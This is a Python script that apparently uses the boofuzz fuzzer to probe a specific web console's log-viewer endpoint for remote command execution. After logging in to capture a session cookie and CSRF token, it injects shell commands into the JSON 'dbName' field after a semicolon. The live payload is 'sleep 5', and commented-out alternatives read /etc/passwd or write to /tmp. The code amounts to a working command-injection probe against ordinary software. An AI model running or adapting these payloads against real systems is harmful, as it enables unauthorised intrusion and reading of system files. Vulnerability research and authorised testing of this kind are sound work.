# -*- coding=utf-8 -*-
import argparse
import json
import re
import textwrap
import traceback

from boofuzz import *
import ssl
import sys
import requests
import time
import urllib.parse

from requests.packages.urllib3.exceptions import InsecureRequestWarning, InsecurePlatformWarning
import warnings

# 过滤掉InsecureRequestWarning警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
requests.packages.urllib3.disable_warnings(InsecurePlatformWarning)
warnings.filterwarnings("ignore", category=UserWarning)

# init key variable
cookie = ""
csrf_token = ""


def get_version():
    version = "0.0.1.20240321"
    usage = '''Example:
    python3 xxx.py -i 172.16.16.16 -p 4444 -u admin -k 12345678
    '''
    ret = f"Current Version: {version}\n{usage}"
    return ret


# todo: encapsulate function to Tool Class
# transfer str to url encode data
def str2urlencode(s: str) -> str:
    url_str = urllib.parse.quote(s, safe='')
    return url_str


def extract_csrf_token(text):
    # page csrf key, refresh each visit
    s = text.find('c$rFt0k3n')
    e = text[s:].find(';')
    token = text[s + 13:s + e - 1]
    return token


def extract_jsessionid(text):
    jsessionid = None
    match = re.search(r"JSESSIONID=([^;]+)", text)
    if match:
        jsessionid = match.group(1)
        print(jsessionid)
    return jsessionid


def get_cookie_token(ip, port, username, passwd):
    # 1.login web to get cookie and csrf_token by requests
    global cookie, csrf_token
    try:
        r = requests.post(url='https://{}:{}/webconsole/Controller'.format(ip, port),
                          data='mode=151&json=%7B%22username%22%3A%22{}%22%2C%22password%22%3A%22{}%22%2C%22languageid%22%3A%221%22%2C%22browser%22%3A%22Firefox_87%22%7D&__RequestType=ajax&t='.format(
                              username, passwd) + str(int(time.time()) + 3600) + '999', verify=False,
                          headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json, text/javascript, */*',
                                   'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate',
                                   'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                                   'X-Requested-With': 'XMLHttpRequest'})
        # print(r.text)
        # get cookie and jsessionid
        cookie = r.cookies.items()[0][1]

        print(f"[D] get_cookie_token() JSESSIONID is: {cookie}")
        time.sleep(0.5)

        # get csrf_token
        url0 = 'https://{}:{}/webconsole/webpages/index.jsp'.format(ip, port)
        r = requests.get(url=url0, headers={
            'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json, text/javascript, */*',
            'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate',
            'Cookie': 'JSESSIONID={}'.format(cookie)}, verify=False)

        csrf_token = extract_csrf_token(r.text)

        print(f"[D] get_cookie_token() csrf token is: {csrf_token}")

        # print("[D] response header: ", r.headers)
    except Exception as err:
        traceback.print_exc()
    return cookie, csrf_token


# =================

def init_logic_fuzz(ip, port, username, password):
    # print(session.fuzz_node.names["cookie"])
    # print(session.fuzz_node.names["token"])

    global cookie
    global csrf_token

    if not cookie or not csrf_token:
        # 1st request
        cookie, csrf_token = get_cookie_token(ip, port, username, password)

    s_initialize(name='Request_rce_fuzz')

    with s_block("Request-Line"):
        s_group("Method", ['POST'])
        s_delim(" ", name='space-1', fuzzable=False)  # fuzz
        # s_static(" ", name='space-1')  # static
        s_static("/webconsole/Controller", name='Request-URI')
        s_delim(" ", name='space-2', fuzzable=False)  # fuzz
        # s_static(" ", name='space-2')
        s_static('HTTP/1.1', name='HTTP-Version')
        s_static("\r\n", name="Request-Line-CRLF")

        s_static(f"Host: {ip}:{port}\r\n")
        s_static(f"Cookie: JSESSIONID={cookie}\r\n")
        s_static(
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0\r\n")
        s_static("Accept: text/plain, */*; q=0.01\r\n")
        s_static("Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r\n")
        s_static("Accept-Encoding: gzip, deflate, br\r\n")
        s_static("Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n")
        s_static("X-Requested-With: XMLHttpRequest\r\n")
        s_static(f"X-Csrf-Token: {csrf_token}\r\n")
        s_static("Content-Length: 308\r\n")
        s_static(f"Origin: https://{ip}:{port}\r\n")
        s_static(
            f"Referer: https://{ip}:{port}/webconsole/webpages/logging/EventViewer.jsp?selectedTab=log_viewer&csrf={csrf_token}\r\n")
        s_static("Sec-Fetch-Dest: empty\r\n")
        s_static("Sec-Fetch-Mode: cors\r\n")
        s_static("Sec-Fetch-Site: same-origin\r\n")
        s_static("Te: trailers\r\n")
        s_static("Connection: close\r\n")

    s_static("\r\n", name="Request-CRLF")

    with s_block('body_content'):
        s_static(
            "mode=5001&json=%7B%22mode%22%3A5001%2C%22filter%22%3A%7B%7D%2C%22clientLimit%22%3A100%2C%22clientOffset%22%3A0%2C%22limit%22%3A100%2C%22offset%22%3A0%2C%22isLive%22%3Atrue%2C%22dbName%22%3A%22%aaa%3B")
        # s_static('sleep%205')  # o1
        s_string('sleep%205')
        # s_static('cat%20%2Fetc%2Fpasswd%20%2Ftmp')
        # s_static('date%20%3E%20%2Ftmp%2F111')
        s_static(
            f"%22%2C%22rowid%22%3A%22%22%2C%22module%22%3A%5B%22system%22%5D%7D&__RequestType=ajax&t={int(time.time())}000&a=")
        # s_random(min_length=1, max_length=1)  # just add for launch fuzzer, but need crash
        s_group("ava", ['a', 'b'])

    # session.connect(s_get('Request_rce_fuzz'), callback=session_pre_send_callback)
    # session.connect(s_get('Request_rce_fuzz'), callback=handle_auth)


# get cookie and csrf_token, then insert it in sessions.fuzz_node
def session_pre_send_callback(target, fuzz_data_logger, session, *args, **kwargs):
    print(f"[DDD] {ip} --- {port} --- {username} --- {password}")

    global cookie
    global csrf_token

    cookie, csrf_token = get_cookie_token(ip, port, username, password)

    # pre_time = round(time.time() * 1000)
    # session.fuzz_node.names["pre_time"] = pre_time

    session.fuzz_node.names["cookie"] = cookie
    session.fuzz_node.names["csrf_token"] = csrf_token

    print(f"[DDD] cookie: {cookie}, token: {csrf_token}")
    # session.fuzz_node.names["pre_time"]._value = f"{pre_time}"
    return session.fuzz_node.render()


def check_reply_code_light(target, fuzz_data_logger, session, test_case_context, *args, **kwargs):
    """
        Args:
            target (Target): Target with sock-like interface.
            fuzz_data_logger (ifuzz_logger.IFuzzLogger): Allows logging of test checks and passes/failures.
                Provided with a test case and test step already opened.
            session (Session): Session object calling post_send.
                Useful properties include last_send and last_recv.
            test_case_context (ProtocolSession): Context for test case-scoped data.
                :py:class:`TestCaseContext` :py:attr:`session_variables <TestCaseContext.session_variables>`
                values are generally set within a callback and referenced in elements via default values of type
                :py:class:`ReferenceValueTestCaseSession`.
            args: Implementations should include \\*args and \\**kwargs for forward-compatibility.
            kwargs: Implementations should include \\*args and \\**kwargs for forward-compatibility.
    """

    # print(session.root.id)  # 0
    # print(session.root.label)  # __ROOT_NODE__
    # print(session.fuzz_node)
    # print(dir(session.fuzz_node.names))
    # print(type(session.fuzz_node.names))

    print(f"[post_send] after fuzz: {session.fuzz_node.names['token']}, {session.fuzz_node.names['cookie']}")

    # print(dir(test_case_context.previous_message))
    # print(test_case_context.previous_message.id, test_case_context.previous_message.label)
    print(f"[D] testcase count: {fuzz_data_logger.test_case_count}")
    # print(dir(test_case_context.current_message))
    print(test_case_context.current_message.id, test_case_context.current_message.label,
          test_case_context.current_message.name)

    # print(f"[Debug] test_case_context.session_variables: {test_case_context.session_variables}")  # {}

    print("x" * 66)
    fuzz_data_logger.log_info(session.last_send)
    print("-" * 66)
    recv_data = session.last_recv
    fuzz_data_logger.log_info(recv_data)
    print("=" * 66)

    if recv_data:
        print(f"[Debug] Received data: {recv_data}")
        print("*" * 99)


# https://github.com/jtpereyda/boofuzz/issues/652#issuecomment-1345185548
def check_auth(target, fuzz_data_logger, session, node, edge, *args, **kwargs):
    global cookie
    global csrf_token

    print(f"[D] in check_auth() ....  jession_id: {cookie}, csrf_token: {csrf_token}")

    print(f"[D] target receive: {target.recv()}")

    print("~" * 66)
    print(session.last_send)
    print("~" * 66)
    print(session.last_recv)
    print("~" * 66)

    if not session.last_send or (session.last_recv and b'Session Expired' in session.last_recv):
        # send login request and set the correct cookie with value from login response
        print("[D] refresh jessionid and csrf_token")
        cookie, csrf_token = get_cookie_token(ip, port, username, password)

        # update cookie attribute in req1 request dynamically
        # s_update(node.name + '.cookie', cookie)
        # s_update(node.name + '.token', csrf_token)

        # session.fuzz_node.names["cookie"] = cookie
        # session.fuzz_node.names["csrf_token"] = csrf_token
        # node.names["cookie"] = cookie
        # node.names["csrf_token"] = csrf_token

        # # 使用s_update需要之前就存在
        # s_update(node.name+".cookie", cookie)
        # s_update(node.name+".csrf_token", csrf_token)

        print("update cookie and session in handle_auth() ....")

        return node.render()


def launcher(ip, port, username, password):
    ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    session = Session(target=Target(
        connection=SSLSocketConnection(host=ip, port=int(port), sslcontext=ctx, recv_timeout=10)),
        restart_threshold=1,
        # pre_send_callbacks=[session_pre_send_callback],
        # post_test_case_callbacks=[resp],
        # receive_data_after_fuzz=True,  # todo test
        sleep_time=0.5
    )

    # todo dev test: write custom request

    init_logic_fuzz(ip, port, username, password)
    session.connect(s_get('Request_rce_fuzz'), callback=check_auth)

    session.num_mutations(1)  # limit mutation count
    # session.fuzz()  # normal complexity
    session.fuzz(max_depth=1)  # less complexity


if __name__ == '__main__':
    # launcher()  # 172.16.16.16 4444 admin 1qaz2wsx#EDC
    # origin usage: python3 debugger.py 172.16.16.16 4444 admin 1qaz2wsx#EDC
    # current usage: python3 debugger.py -i 172.16.16.16 -p 4444 -u admin -k 1qaz2wsx#EDC

    parser = argparse.ArgumentParser(
        description='Boofuzz Test Example',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Example:
        python3 xxx.py -i 172.16.16.16 -p 4444 -u admin -k 12345678
          '''))
    # create standard terminal cmd ui
    parser.add_argument('-i', '--ip', type=str, help='target ip')
    parser.add_argument('-p', '--port', type=int, default=80, help='target port')
    parser.add_argument('-u', '--user', type=str, help='login user name')
    parser.add_argument('-k', '--passwd', type=str, help='login password')

    args = parser.parse_args()
    # print(f"[D] args: {args}")

    global ip
    global port
    global username
    global password

    if args.ip and args.port and args.user and args.passwd:

        ip = args.ip
        port = args.port
        username = args.user
        password = args.passwd

        # launcher(ip, port, username, password)

        launcher(args.ip, args.port, args.user, args.passwd)
    else:
        print(get_version())
